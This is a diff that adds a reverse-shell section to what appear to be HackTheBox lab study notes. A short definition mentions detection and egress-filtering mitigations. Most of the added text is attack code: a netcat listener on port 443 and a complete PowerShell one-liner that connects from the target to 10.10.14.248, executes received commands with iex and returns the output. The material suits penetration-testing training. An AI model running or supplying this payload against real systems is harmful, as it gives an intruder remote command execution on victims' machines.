@@ -128,3 +128,26 @@ OathBornX@htb[/htb]$ nc -nv 10.129.41.200 7777
 
 Target@server:~$  
 ```
+
+---
+
+# Reverse shell
+
+A `reverse shell` is when a compromised host makes an outbound connection to an attacker-controlled `listener` so the attacker gets an interactive `shell` on the victim—useful to bypass `NAT` and blocked inbound ports but noisy on `egress` (unusual IPs/ports, `DNS` tunneling) and detectable by `IDS`/`SIEM`; mitigate with strict `egress firewall` rules, outbound proxies, and endpoint monitoring.
+
+#### Server (`attack machine`)
+
+```bash
+OathBornX@htb[/htb]$ sudo nc -lvnp 443
+Listening on 0.0.0.0 443
+```
+
+#### Client (target)
+
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.248',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+
+
+
